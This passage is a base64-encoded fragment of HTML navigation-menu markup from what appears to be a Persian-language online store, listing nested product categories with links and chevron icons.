zaGFkb3cnPjwvdWw+PC9saT48bGkgZGF0YS1pZD0nMTk0Nyc+PGEgaHJlZj0nL9mF2K3YtdmI2YTYp9iqfkNhdGVnb3J5fjE5NDcnICBjbGFzcz0nZGVza3RvcG1lbnUtbDItaXRlbScgPtiq2KzZh9uM2LLYp9iqINit2YHYp9i42KrbjCDZiCDYp9mF2YbbjNiq24w8L2E+IDx1bCBjbGFzcz0nZGVza3RvcG1lbnUtbDMgYm94c2hhZG93Jz48L3VsPjwvbGk+PGxpIGRhdGEtaWQ9JzE5MzY3Jz48YSBocmVmPScv2YXYrdi12YjZhNin2Kp+Q2F0ZWdvcnl+MTkzNjcnICBjbGFzcz0nZGVza3RvcG1lbnUtbDItaXRlbScgPtin2KjYstin2LEg2YTZiNmE2Ycg2qnYtNuMPC9hPiA8dWwgY2xhc3M9J2Rlc2t0b3BtZW51LWwzIGJveHNoYWRvdyc+PC91bD48L2xpPjxsaSBkYXRhLWlkPScyNzU3MCc+PGEgaHJlZj0nL9mF2K3YtdmI2YTYp9iqfkNhdGVnb3J5fjI3NTcwJyAgY2xhc3M9J2Rlc2t0b3BtZW51LWwyLWl0ZW0nID7Yp9io2LLYp9ixINmF2qnYp9mG24zaqduMINmIINio2YbYstuM2YbbjDwvYT4gPHVsIGNsYXNzPSdkZXNrdG9wbWVudS1sMyBib3hzaGFkb3cnPjwvdWw+PC9saT48bGkgZGF0YS1pZD0nMzA2NTgnPjxhIGhyZWY9Jy/Zhdit2LXZiNmE2KfYqn5DYXRlZ29yeX4zMDY1OCcgIGNsYXNzPSdkZXNrdG9wbWVudS1sMi1pdGVtJyA+2KfYqNiy2KfYsSDZhtis2KfYsduMPC9hPiA8dWwgY2xhc3M9J2Rlc2t0b3BtZW51LWwzIGJveHNoYWRvdyc+PC91bD48L2xpPjxsaSBkYXRhLWlkPSczMDY3OSc+PGEgaHJlZj0nL9mF2K3YtdmI2YTYp9iqfkNhdGVnb3J5fjMwNjc5JyAgY2xhc3M9J2Rlc2t0b3BtZW51LWwyLWl0ZW0nID7Yp9io2LLYp9ixINiv2YLbjNmCINmIINin2YbYr9in2LLZhyDar9uM2LHbjCAgPC9hPiA8dWwgY2xhc3M9J2Rlc2t0b3BtZW51LWwzIGJveHNoYWRvdyc+PC91bD48L2xpPjxsaSBkYXRhLWlkPScxMTExNic+PGEgaHJlZj0nL9mF2K3YtdmI2YTYp9iqfkNhdGVnb3J5fjExMTE2JyAgY2xhc3M9J2Rlc2t0b3BtZW51LWwyLWl0ZW0nID7Yp9io2LLYp9ixINmIINmF2KfYtNuM2YYg2YfYp9uMINi12YbYudiq24w8L2E+IDx1bCBjbGFzcz0nZGVza3RvcG1lbnUtbDMgYm94c2hhZG93Jz48L3VsPjwvbGk+PGxpIGRhdGEtaWQ9JzM1Njg3Jz48YSBocmVmPScv2YXYrdi12YjZhNin2Kp+Q2F0ZWdvcnl+MzU2ODcnICBjbGFzcz0nZGVza3RvcG1lbnUtbDItaXRlbScgPtin2KjYstin2LEg2K7Ysdin2LfbjDwvYT4gPHVsIGNsYXNzPSdkZXNrdG9wbWVudS1sMyBib3hzaGFkb3cnPjwvdWw+PC9saT48bGkgZGF0YS1pZD0nMjAzMzInPjxhIGhyZWY9Jy/Zhdit2LXZiNmE2KfYqn5DYXRlZ29yeX4yMDMzMicgIGNsYXNzPSdkZXNrdG9wbWVudS1sMi1pdGVtJyA+INin2KjYstin2LEg2YbZgtin2LTbjCDYs9in2K7YqtmF2KfZhjwvYT4gPHVsIGNsYXNzPSdkZXNrdG9wbWVudS1sMyBib3hzaGFkb3cnPjwvdWw+PC9saT48bGkgZGF0YS1pZD0nNTIxNDAnPjxhIGhyZWY9Jy/Zhdit2LXZiNmE2KfYqn5DYXRlZ29yeX41MjE0MCcgIGNsYXNzPSdkZXNrdG9wbWVudS1sMi1pdGVtJyA+2KrYrNmH24zYstin2Kog2KLYstmF2KfbjNi02q/Yp9mH24w8L2E+IDx1bCBjbGFzcz0nZGVza3RvcG1lbnUtbDMgYm94c2hhZG93Jz48L3VsPjwvbGk+PGxpIGRhdGEtaWQ9JzExMDEzNSc+PGEgaHJlZj0nL9mF2K3YtdmI2YTYp9iqfkNhdGVnb3J5fjExMDEzNScgIGNsYXNzPSdkZXNrdG9wbWVudS1sMi1pdGVtJyA+2KrYrNmH24zYstin2Kog2KfZhNqp2KrYsdmI2YbbjNqpIDwvYT4gPHVsIGNsYXNzPSdkZXNrdG9wbWVudS1sMyBib3hzaGFkb3cnPjwvdWw+PC9saT48bGkgZGF0YS1pZD0nMTE1MjM5Jz48YSBocmVmPScv2YXYrdi12YjZhNin2Kp+Q2F0ZWdvcnl+MTE1MjM5JyAgY2xhc3M9J2Rlc2t0b3BtZW51LWwyLWl0ZW0nID7Yqtis2YfbjNiy2KfYqiDZh9uM2K/YsdmI2YTbjNqpPC9hPiA8dWwgY2xhc3M9J2Rlc2t0b3BtZW51LWwzIGJveHNoYWRvdyc+PC91bD48L2xpPjxsaSBkYXRhLWlkPScxMTYyOTMnPjxhIGhyZWY9Jy/Zhdit2LXZiNmE2KfYqn5DYXRlZ29yeX4xMTYyOTMnICBjbGFzcz0nZGVza3RvcG1lbnUtbDItaXRlbScgPtiq2KzZh9uM2LLYp9iqINmH2KrZhCDZiCDYsdiz2KrZiNix2KfZhjwvYT4gPHVsIGNsYXNzPSdkZXNrdG9wbWVudS1sMyBib3hzaGFkb3cnPjwvdWw+PC9saT48bGkgZGF0YS1pZD0nMTIxNDA2Jz48YSBocmVmPScv2YXYrdi12YjZhNin2Kp+Q2F0ZWdvcnl+MTIxNDA2JyAgY2xhc3M9J2Rlc2t0b3BtZW51LWwyLWl0ZW0nID7Yqtis2YfbjNiy2KfYqiDZiCDZhdmE2LLZiNmF2KfYqiDZgdix2YjYtNqv2KfZh9uMPC9hPiA8dWwgY2xhc3M9J2Rlc2t0b3BtZW51LWwzIGJveHNoYWRvdyc+PC91bD48L2xpPjwvdWw+PC9saT48bGkgY2xhc3M9J2Rlc2t0b3BtZW51LWwxLWl0ZW0nPjxhIGhyZWY9Jy/Zhdit2LXZiNmE2KfYqn5DYXRlZ29yeX4zMTI5MScgID7Ys9in2K7YqtmF2KfZhiDZiCDZgdi22KfbjCDYudmF2YjZhduMPC9hPjxzdmcgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiIGZpbGw9ImN1cnJlbnRDb2xvciIgY2xhc3M9ImJpIGJpLWNoZXZyb24tZG93biIgdmlld0JveD0iMCAwIDE2IDE2Ij48cGF0aCBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0xLjY0NiA0LjY0NmEuNS41IDAgMCAxIC43MDggMEw4IDEwLjI5M2w1LjY0Ni01LjY0N2EuNS41IDAgMCAxIC43MDguNzA4bC02IDZhLjUuNSAwIDAgMS0uNzA4IDBsLTYtNmEuNS41IDAgMCAxIDAtLjcwOHoiLz48L3N2Zz48dWwgY2xhc3M9J2Rlc2t0b3BtZW51LWwyIGJveHNoYWRvdycgIHN0eWxlPSdkaXNwbGF5OiBub25lJz48bGkgZGF0YS1pZD0nMTgxNDEnPjxhIGhyZWY9Jy/Zhdit2LXZiNmE2KfYqn5DYXRlZ29yeX4xODE0MScgIGNsYXNzPSdkZXNrdG9wbWVudS1sMi1pdGVtJyA+2LTbjNix2KLZhNin2Kog2LPYp9iu2KrZhdin2YbbjCA8L2E+IDx1bCBjbGFzcz0nZGVza3RvcG1lbnUtbDMgYm94c2hhZG93Jz48L3VsPjwvbGk+PGxpIGRhdGEtaWQ9JzE4NTMwJz48YSBocmVmPScv2YXYrdi12YjZhNin2Kp+Q2F0ZWdvcnl+MTg1MzAnICBjbGFzcz0nZGVza3RvcG1lbnUtbDItaXRlbScgPtiq2KzZh9uM2LLYp9iqINii2LTZvtiy2K7Yp9mG2Yc8L2E+IDx1bCBjbGFzcz0nZGVza3RvcG1lbnUtbDMgYm94c2hhZG93Jz48L3VsPjwvbGk+PGxpIGRhdGEtaWQ9JzE4NjE1Jz48YSBocmVmPScv2YXYrdi12YjZhNin2Kp+Q2F0ZWdvcnl+MTg2MTUnICBjbGFzcz0nZGVza3RvcG1lbnUtbDItaXRlbScgPtuM2LHYp9mCINii2YTYp9iqPC9hPiA8dWwgY2xhc3M9J2Rlc2t0b3BtZW51LWwzIGJveHNoYWRvdyc+PC91bD48L2xpPjxsaSBkYXRhLWlkPScxODYxNyc+PGEgaHJlZj0nL9mF2K3YtdmI2YTYp9iqfkNhdGVnb3J5fjE4NjE3JyAgY2xhc3M9J2Rlc2t0b3BtZW51LWwyLWl0ZW0nID7Yqtis2YfbjNiy2KfYqiDYp9mE2qnYqtix24zaqduMIDwvYT4gPHVsIGNsYXNzPSdkZXNrdG9wbWVudS1sMyBib3hzaGFkb3cnPjwvdWw+PC9saT48bGkgZGF0YS1pZD0nMTkxMDAnPjxhIGhyZWY9Jy/Zhdit2LXZiNmE2KfYqn5DYXRlZ29yeX4xOTEwMCcgIGNsYXNzPSdkZXNrdG9wbWVudS1sMi1pdGVtJyA+2KrYrNmH24zYstin2Kog2K/Ys9iq2LTZiNuM24wg2Ygg2K3Zhdin2YU8L2E+IDx1bCBjbGFzcz0nZGVza3RvcG1lbnUtbDMgYm94c2hhZG93Jz48L3VsPjwvbGk+PGxpIGRhdGEtaWQ9JzIwNTY1Jz48YSBocmVmPScv2YXYrdi12YjZhNin2Kp+Q2F0ZWdvcnl+MjA1NjUnICBjbGFzcz0nZGVza3RvcG1lbnUtbDItaXRlbScgPtmF2K3YtdmI2YTYp9iqINi024zZhduM2KfbjNuMPC9hPiA8dWwgY2xhc3M9J2Rlc2t0b3BtZW51LWwzIGJveHNoYWRvdyc+PC91bD48L2xpPjxsaSBkYXRhLWlkPSc3MDQ0NSc+PGEgaHJlZj0nL9mF2K3YtdmI2YTYp9iqfkNhdGVnb3J5fjcwNDQ1JyAgY2xhc3M9J2Rlc2t0b3BtZW51LWwyLWl0ZW0nID7Zhdi12KfZhNitINiz2KfYrtiq2YXYp9mG24w8L2E+IDx1bCBjbGFzcz0nZGVza3RvcG1lbnUtbDMgYm94c2hhZG93Jz48L3VsPjwvbGk+PGxpIGRhdGEtaWQ9JzMxMDU3Jz48YSBocmVmPScv2YXYrdi12YjZhNin2Kp+Q2F0ZWdvcnl+MzEwNTcnICBjbGFzcz0nZGVza3RvcG1lbnUtbDItaXRlbScgPtiq2LLYptuM2YbYp9iqINiz2KfYrtiq2YXYp9mG24w8L2E+IDx1bCBjbGFzcz0nZGVza3RvcG1lbnUtbDMgYm94c2hhZG93Jz48L3VsPjwvbGk+PGxpIGRhdGEtaWQ9JzE0ODk2Jz48YSBocmVmPScv2YXYrdi12YjZhNin2Kp+Q2F0ZWdvcnl+MTQ4OTYnICBjbGFzcz0nZGVza3RvcG1lbnUtbDItaXRlbScgPtiv2qnZiNix2KfYs9uM2YjZhiDZgdi22KfbjCDYudmF2YjZhduMPC9hPiA8dWwgY2xhc3M9J2Rlc2t0b3BtZW51LWwzIGJveHNoYWRvdyc+PC91bD48L2xpPjxsaSBkYXRhLWlkPSc0OTcyNSc+PGEgaHJlZj0nL9mF2K3YtdmI2YTYp9iqfkNhdGVnb3J5fjQ5NzI1JyAgY2xhc3M9J2Rlc2t0b3BtZW51LWwyLWl0ZW0nID7Yqtis2YfbjNiy2KfYqiDYtNmH2LHbjCDZiCDYqtix2KfZgduM2qk8L2E+IDx1bCBjbGFzcz0nZGVza3RvcG1lbnUtbDMgYm94c2hhZG93Jz48L3VsPjwvbGk+PGxpIGRhdGEtaWQ9Jzc1MjQ5Jz48YSBocmVmPScv2YXYrdi12YjZhNin2Kp+Q2F0ZWdvcnl+NzUyNDknICBjbGFzcz0nZGVza3RvcG1lbnUtbDItaXRlbScgPtmF2YbYp9io2Lkg2Ygg2YXYrtin2LLZhjwvYT4gPHVsIGNsYXNzPSdkZXNrdG9wbWVudS1sMyBib3hzaGFkb3cnPjwvdWw+PC9saT48L3VsPjwvbGk+PGxpIGNsYXNzPSdkZXNrdG9wbWVudS1sMS1pdGVtJz48YSBocmVmPScv2YXYrdi12YjZhNin2Kp+Q2F0ZWdvcnl+MTExMjQnICA+2YXYp9iv2LEg2Ygg2qnZiNiv2qk8L2E+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgaGVpZ2h0PSIxNiIgZmlsbD0iY3VycmVudENvbG9yIiBjbGFzcz0iYmkgYmktY2hldnJvbi1kb3duIiB2aWV3Qm94PSIwIDAgMTYgMTYiPjxwYXRoIGZpbGwtcnVsZT0iZXZlbm9kZCIgZD0iTTEuNjQ2IDQuNjQ2YS41LjUgMCAwIDEgLjcwOCAwTDggMTAuMjkzbDUuNjQ2LTUuNjQ3YS41LjUgMCAwIDEgLjcwOC43MDhsLTYgNmEuNS41IDAgMCAxLS43MDggMGwtNi02YS41LjUgMCAwIDEgMC0uNzA4eiIvPjwvc3ZnPjx1bCBjbGFzcz0nZGVza3RvcG1lbnUtbDIgYm94c2hhZG93JyAgc3R5bGU9J2Rpc3BsYXk6IG5vbmUnPjxsaSBkYXRhLWlkPScxMTEyNSc+PGEgaHJlZj0nL9mF2K3YtdmI2YTYp9iqfkNhdGVnb3J5fjExMTI1JyAgY2xhc3M9J2Rlc2t0b3BtZW51LWwyLWl0ZW0nID4g2YTZiNin2LLZhSDar9ix2K/YtCDZiCDYs9mB2LEg2YbZiNiy2KfYrzwvYT4gPHVsIGNsYXNzPSdkZXNrdG9wbWVudS1sMyBib3hzaGFkb3cnPjwvdWw+PC9saT48bGkgZGF0YS1pZD0nMTExMjYnPjxhIGhyZWY9Jy/Zhdit2LXZiNmE2KfYqn5DYXRlZ29yeX4xMTEyNicgIGNsYXNzPSdkZXNrdG9wbWVudS1sMi1pdGVtJyA+2KjZh9iv2KfYtNiqINmIINit2YXYp9mFINmG2YjYstin2K8gPC9hPiA8dWwgY2xhc3M9J2Rlc2t0b3BtZW51LWwzIGJveHNoYWRvdyc+PC91bD48L2xpPjxsaSBkYXRhLWlkPScxMTEyNyc+PGEgaHJlZj0nL9mF2K3YtdmI2YTYp9iqfkNhdGVnb3J5fjExMTI3JyAgY2xhc3M9J2Rlc2t0b3BtZW51LWwyLWl0ZW0nID7ZiNiz2KfbjNmEINiu2YjYp9ioINmG2YjYstin2K88L2E+IDx1bCBjbGFzcz0nZGVza3RvcG1lbnUtbDMgYm94c2hhZG93Jz48L3VsPjwvbGk+PGxpIGRhdGEtaWQ9JzExMTI4Jz48YSBocmVmPScv2YXYrdi12YjZhNin2Kp+Q2F0ZWdvcnl+MTExMjgnICBjbGFzcz0nZGVza3RvcG1lbnUtbDItaXRlbScgPtmE2YjYp9iy2YUg2LrYsNinINiu2YjYsduMINmG2YjYstin2K88L2E+IDx1bCBjbGFzcz0nZGVza3RvcG1lbnUtbDMgYm94c2hhZG93Jz48L3VsPjwvbGk+PGxpIGRhdGEtaWQ9JzExMTI5Jz48YSBocmVmPScv2YXYrdi12YjZhNin2Kp+Q2F0ZWdvcnl+MTExMjknICBjbGFzcz0nZGVza3RvcG1lbnUtbDItaXRlbScgPtin24zZhdmG24zYjCDZhdix2KfZgtio2Kog2YbZiNiy2KfYrzwvYT4gPHVsIGNsYXNzPSdkZXNrdG9wbWVudS1sMyBib3hzaGFkb3cnPjwvdWw+PC9saT48bGkgZGF0YS1pZD0nMTM4NzInPjxhIGhyZWY9Jy/Zhdit2LXZiNmE2KfYqn5DYXRlZ29yeX4xMzg3MicgIGNsYXNzPSdkZXNrdG9wbWVudS1sMi1pdGVtJyA+2YTYqNin2LMg2qnZiNiv2qkg2Ygg2YbZiNiy2KfYrzwvYT4gPHVsIGNsYXNzPSdkZXNrdG9wbWVudS1sMyBib3hzaGFkb3cnPjwvdWw+PC9saT48bGkgZGF0YS1pZD0nMTM4NzMnPjxhIGhyZWY9Jy/Zhdit2LXZiNmE2KfYqn5DYXRlZ29yeX4xMzg3MycgIGNsYXNzPSdkZXNrdG9wbWVudS1sMi1pdGVtJyA+2YTZiNin2LLZhSDYqtix2KbbjNmG24wg2KfYqtin2YIg2qnZiNiv2qk8L2E+IDx1bCBjbGFzcz0nZGVza3RvcG1lbnUtbDMgYm94c2hhZG93Jz48L3VsPjwvbGk+PGxpIGRhdGEtaWQ9JzE0NDMzJz48YSBocmVmPScv2YXYrdi12YjZhNin2Kp+Q2F0ZWdvcnl+MTQ0MzMnICBjbGFzcz0nZGVza3RvcG1lbnUtbDItaXRlbScgPtiz2LHar9ix2YXbjCDZiCDYotmF2YjYsti0INqp2YjYr9qpPC9hPiA8dWwgY2xhc3M9J2Rlc2t0b3BtZW51LWwzIGJveHNoYWRvdyc+PC91bD48L2xpPjxsaSBkYXRhLWlkPSczMTQyMyc+PGEgaHJlZj0nL9mF2K3YtdmI2YTYp9iqfkNhdGVnb3J5fjMxNDIzJyAgY2xhc3M9J2Rlc2t0b3BtZW51LWwyLWl0ZW0nID7Yutiw2KfbjCDaqdmI2K/aqTwvYT4gPHVsIGNsYXNzPSdkZXNrdG9wbWVudS1sMyBib3hzaGFkb3cnPjwvdWw+PC9saT48L3VsPjwvbGk+PGxpIGNsYXNzPSdkZXNrdG9wbWVudS1sMS1pdGVtJz48YSBocmVmPScv2YXYrdi12YjZhNin2Kp+Q2F0ZWdvcnl+MTMxNDAnICA+2YXYryDZiCDZvtmI2LTYp9qpPC9hPjxzdmcgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiIGZpbGw9ImN1cnJlbnRDb2xvciIgY2xhc3M9ImJpIGJpLWNoZXZyb24tZG93biIgdmlld0JveD0iMCAwIDE2IDE2Ij48cGF0aCBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0xLjY0NiA0LjY0NmEuNS41IDAgMCAxIC43MDggMEw4IDEwLjI5M2w1LjY0Ni01LjY0N2EuNS41IDAgMCAxIC43MDguNzA4bC02IDZhLjUuNSAwIDAgMS0uNzA4IDBsLTYtNmEuNS41IDAgMCAxIDAtLjcwOHoiLz48L3N2Zz48dWwgY2xhc3M9J2Rlc2t0b3BtZW51LWwyIGJveHNoYWRvdycgIHN0eWxlPSdkaXNwbGF5OiBub25lJz48bGkgZGF0YS1pZD0nMTMxNDEnPjxhIGhyZWY9Jy/Zhdit2LXZiNmE2KfYqn5DYXRlZ29yeX4xMzE0MScgIGNsYXNzPSdkZXNrdG9wbWVudS1sMi1pdGVtJyA+2b7ZiNi02KfaqSDZhdix2K/Yp9mG2Yc8L2E+IDx1bCBjbGFzcz0nZGVza3RvcG1lbnUtbDMgYm94c2hhZG93Jz48L3VsPjwvbGk+PGxpIGRhdGEtaWQ9JzE5MTQnPjxhIGhyZWY9Jy/Zhdit2LXZiNmE2KfYqn5DYXRlZ29yeX4xOTE0JyAgY2xhc3M9J2Rlc2t0b3BtZW51LWwyLWl0ZW0nID7YstuM2YjYsdii2YTYp9iqPC9hPiA8dWwgY2xhc3M9J2Rlc2t0b3BtZW51LWwzIGJveHNoYWRvdyc+PC91bD48L2xpPjxsaSBkYXRhLWlkPScxMzE0Mic+PGEgaHJlZj0nL9mF2K3YtdmI2YTYp9iqfkNhdGVnb3J5fjEzMTQyJyAgY2xhc3M9J2Rlc2t0b3BtZW51LWwyLWl0ZW0nID7ZvtmI2LTYp9qpINiy2YbYp9mG2Yc8L2E+IDx1bCBjbGFzcz0nZGVza3RvcG1lbnUtbDMgYm94c2hhZG93Jz48L3VsPjwvbGk+PGxpIGRhdGEtaWQ9JzEzMTQzJz48YSBocmVmPScv2YXYrdi12YjZhNin2Kp+Q2F0ZWdvcnl+MTMxNDMnICBjbGFzcz0nZGVza3RvcG1lbnUtbDItaXRlbScgPtm+2YjYtNin2qkg2qnZiNiv2qnYp9mGPC9hPiA8dWwgY2xhc3M9J2Rlc2t0b3BtZW51LWwzIGJveHNoYWRvdyc+PC91bD48L2xpPjxsaSBkYXRhLWlkPSc4NTMxMCc+PGEgaHJlZj0nL9mF2K3YtdmI2YTYp9iqfkNhdGVnb3J5fjg1MzEwJyAgY2xhc3M9J2Rlc2t0b3BtZW51LWwyLWl0ZW0nID7aqduM2YEg2Ygg2qnZgdi0PC9hPiA8dWwgY2xhc3M9J2Rlc2t0b3BtZW51LWwzIGJveHNoYWRvdyc+PC91bD48L2xpPjxsaSBkYXRhLWlkPScxMzE0OCc+PGEgaHJlZj0nL9mF2K3YtdmI2YTYp9iqfkNhdGVnb3J5fjEzMTQ4JyAgY2xhc3M9J2Rlc2t0b3BtZW51LWwyLWl0ZW0nID7aqdmF2LHYqNmG2K8g2Ygg2KjZhtivINi02YTZiNin2LE8L2E+IDx1bCBjbGFzcz0nZGVza3RvcG1lbnUtbDMgYm94c2hhZG93Jz48L3VsPjwvbGk+PGxpIGRhdGEtaWQ9JzEzNTY2Jz48YSBocmVmPScv2YXYrdi12YjZhNin2Kp+Q2F0ZWdvcnl+MTM1NjYnICBjbGFzcz0nZGVza3RvcG1lbnUtbDItaXRlbScgPti524zZhtqpINii2YHYqtin2KjbjDwvYT4gPHVsIGNsYXNzPSdkZXNrdG9wbWVudS1sMyBib3hzaGFkb3cnPjwvdWw+PC9saT48bGkgZGF0YS1pZD0nMzEyNTInPjxhIGhyZWY9Jy/Zhdit2LXZiNmE2KfYqn5DYXRlZ29yeX4zMTI1MicgIGNsYXNzPSdkZXNrdG9wbWVudS1sMi1pdGVtJyA+2LPYqiDZh9iv24zZhyA8L2E+IDx1bCBjbGFzcz0nZGVza3RvcG1lbnUtbDMgYm94c2hhZG93Jz48L3VsPjwvbGk+PGxpIGRhdGEtaWQ9JzM3MjQ0Jz48YSBocmVmPScv2YXYrdi12YjZhNin2Kp+Q2F0ZWdvcnl+MzcyNDQnICBjbGFzcz0nZGVza3RvcG1lbnUtbDItaXRlbScgPtiz2Kog2YTYqNin2LMg2LLZhiDZiCDYtNmI2YfYsTwvYT4gPHVsIGNsYXNzPSdkZXNrdG9wbWVudS1sMyBib3hzaGFkb3cnPjwvdWw+PC9saT48bGkgZGF0YS1pZD0nMzkxMjUnPjxhIGhyZWY9Jy/Zhdit2LXZiNmE2KfYqn5DYXRlZ29yeX4zOTEyNScgIGNsYXNzPSdkZXNrdG9wbWVudS1sMi1pdGVtJyA+2b7Yp9ix2obZhyDZiCDZhdmG2LPZiNis2KfYqjwvYT4gPHVsIGNsYXNzPSdkZXNrdG9wbWVudS1sMyBib3hzaGFkb3cnPjwvdWw+PC9saT48L3VsPjwvbGk+PGxpIGNsYXNzPSdkZXNrdG9wbWVudS1sMS1pdGVtJz48YSBocmVmPScv2YXYrdi12YjZhNin2Kp+Q2F0ZWdvcnl+MzAyNDMnICA+2K7ZiNix2KfaqduMINmH2Kc8L2E+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgaGVpZ2h0PSIxNiIgZmlsbD0iY3VycmVudENvbG9yIiBjbGFzcz0iYmkgYmktY2hldnJvbi1kb3duIiB2aWV3Qm94PSIwIDAgMTYgMTYiPjxwYXRoIGZpbGwtcnVsZT0iZXZlbm9kZCIgZD0iTTEuNjQ2IDQuNjQ2YS41LjUgMCAwIDEgLjcwOCAwTDggMTAuMjkzbDUuNjQ2LTUuNjQ3YS41LjUgMCAwIDEgLjcwOC43MDhsLTYgNmEuNS41IDAgMCAxLS43MDggMGwtNi02YS41LjUgMCAwIDEgMC0uNzA4eiIvPjwvc3ZnPjx1bCBjbGFzcz0nZGVza3RvcG1lbnUtbDIgYm94c2hhZG93JyAgc3R5bGU9J2Rpc3BsYXk6IG5vbmUnPjxsaSBkYXRhLWlkPSczMDI0OSc+PGEgaHJlZj0nL9mF2K3YtdmI2YTYp9iqfkNhdGVnb3J5fjMwMjQ5JyAgY2xhc3M9J2Rlc2t0b3BtZW51LWwyLWl0ZW0nID7ZhduM2YjZhyDZiCDYs9io2LLbjNis2KfYqjwvYT4gPHVsIGNsYXNzPSdkZXNrdG9wbWVudS1sMyBib3hzaGFkb3cnPjwvdWw+PC9saT48bGkgZGF0YS1pZD0nMzAyNTAnPjxhIGhyZWY9Jy/Zhdit2LXZiNmE2KfYqn5DYXRlZ29yeX4zMDI1MCcgIGNsYXNzPSdkZXNrdG9wbWVudS1sMi1pdGVtJyA+2KLYrNuM2YQg2Ygg2K7YtNqp2KjYp9ixPC9hPiA8dWwgY2xhc3M9J2Rlc2t0b3BtZW51LWwzIGJveHNoYWRvdyc+PC91bD48L2xpPjxsaSBkYXRhLWlkPSczMDI1Nic+PGEgaHJlZj0nL9mF2K3YtdmI2YTYp9iqfkNhdGVnb3J5fjMwMjU2JyAgY2xhc3M9J2Rlc2t0b3BtZW51LWwyLWl0ZW0nID7YutmE2KfYqiDZiCDYrdio2YjYqNin2Ko8L2E+IDx1bCBjbGFzcz0nZGVza3RvcG1lbnUtbDMgYm94c2hhZG93Jz48L3VsPjwvbGk+PGxpIGRhdGEtaWQ9JzMwMjYxJz48YSBocmVmPScv2YXYrdi12YjZhNin2Kp+Q2F0ZWdvcnl+MzAyNjEnICBjbGFzcz0nZGVza3RvcG1lbnUtbDItaXRlbScgPtmC2YbYp9iv24w8L2E+IDx1bCBjbGFzcz0nZGVza3RvcG1lbnUtbDMgYm94c2hhZG93Jz48L3VsPjwvbGk+PGxpIGRhdGEtaWQ9JzMwMjY2Jz48YSBocmVmPScv2YXYrdi12YjZhNin2Kp+Q2F0ZWdvcnl+MzAyNjYnICBjbGFzcz0nZGVza3RvcG1lbnUtbDItaXRlbScgPtiz2YjZvtixINmF2KfYsdqp2Ko8L2E+IDx1bCBjbGFzcz0nZGVza3RvcG1lbnUtbDMgYm94c2hhZG93Jz48L3VsPjwvbGk+PGxpIGRhdGEtaWQ9JzMwMzI0Jz48YSBocmVmPScv2YXYrdi12YjZhNin2Kp+Q2F0ZWdvcnl+MzAzMjQnICBjbGFzcz0nZGVza3RvcG1lbnUtbDItaXRlbScgPtqv24zYp9mH2KfZhiDYr9in2LHZiNuM24w8L2E+IDx1bCBjbGFzcz0nZGVza3RvcG1lbnUtbDMgYm94c2hhZG93Jz48L3VsPjwvbGk+PGxpIGRhdGEtaWQ9JzQ0MzM2Jz48YSBocmVmPScv2YXYrdi12YjZhNin2Kp+Q2F0ZWdvcnl+NDQzMzYnICBjbGFzcz0nZGVza3RvcG1lbnUtbDItaXRlbScgPtmF2YTYstmI2YXYp9iqINmF2LXYsdmB24wg2YXZhtiy2YQ8L2E+IDx1bCBjbGFzcz0nZGVza3RvcG1lbnUtbDMgYm94c2hhZG93Jz48L3VsPjwvbGk+PC91bD48L2xpPjxsaSBjbGFzcz0nZGVza3RvcG1lbnUtbDEtaXRlbSc+PGEgaHJlZj0nL9mF2K3YtdmI2YTYp9iqfkNhdGVnb3J5fjMwMjc3JyAgPtm+2Kog2LTYp9m+PC9hPjxzdmcgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiIGZpbGw9ImN1cnJlbnRDb2xvciIgY2xhc3M9ImJpIGJpLWNoZXZyb24tZG93biIgdmlld0JveD0iMCAwIDE2IDE2Ij48cGF0aCBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0xLjY0NiA0LjY0NmEuNS41IDAgMCAxIC43MDggMEw4IDEwLjI5M2w1LjY0Ni01LjY0N2EuNS41IDAgMCAxIC43MDguNzA4bC02IDZhLjUuNSAwIDAgMS0uNzA4IDBsLTYtNmEuNS41IDAgMCAxIDAtLjcwOHoiLz48L3N2Zz48dWwgY2xhc3M9J2Rlc2t0b3BtZW51LWwyIGJveHNoYWRvdycgIHN0eWxlPSdkaXNwbGF5OiBub25lJz48bGkgZGF0YS1pZD0nMzAyNzgnPjxhIGhyZWY9Jy/Zhdit2LXZiNmE2KfYqn5DYXRlZ29yeX4zMDI3OCcgIGNsYXNzPSdkZXNrdG9wbWVudS1sMi1pdGVtJyA+2K/YsdmF2KfZhiDZiCDYs9mE2KfZhdiqINit24zZiNin2YbYp9iqPC9hPiA8dWwgY2xhc3M9J2Rlc2t0b3BtZW51LWwzIGJveHNoYWRvdyc+PC91bD48L2xpPjxsaSBkYXRhLWlkPSczMDI4Mic+PGEgaHJlZj0nL9mF2K3YtdmI2YTYp9iqfkNhdGVnb3J5fjMwMjgyJyAgY2xhc3M9J2Rlc2t0b3BtZW51LWwyLWl0ZW0nID7ZvtmI2LTYp9qpINit24zZiNin2YbYp9iqPC9hPiA8dWwgY2xhc3M9J2Rlc2t0b3BtZW51LWwzIGJveHNoYWRvdyc+PC91bD48L2xpPjxsaSBkYXRhLWlkPSczMDI4NCc+PGEgaHJlZj0nL9mF2K3YtdmI2YTYp9iqfkNhdGVnb3J5fjMwMjg0JyAgY2xhc3M9J2Rlc2t0b3BtZW51LWwyLWl0ZW0nID7ZhNmI2KfYstmFINio2YfYr9in2LTYqtuMINit24zZiNin2YbYp9iqPC9hPiA8dWwgY2xhc3M9J2Rlc2t0b3BtZW51LWwzIGJveHNoYWRvdyc+PC91bD48L2xpPjxsaSBkYXRhLWlkPSczMDI4OSc+PGEgaHJlZj0nL9mF2K3YtdmI2YTYp9iqfkNhdGVnb3J5fjMwMjg5JyAgY2xhc3M9J2Rlc2t0b3BtZW51LWwyLWl0ZW0nID7ZhNmI2KfYstmFINmG2q/Zh9iv2KfYsduMINmIINio2KfYstuMINit24zZiNin2YbYp9iqPC9hPiA8dWwgY2xhc3M9J2Rlc2t0b3BtZW51LWwzIGJveHNoYWRv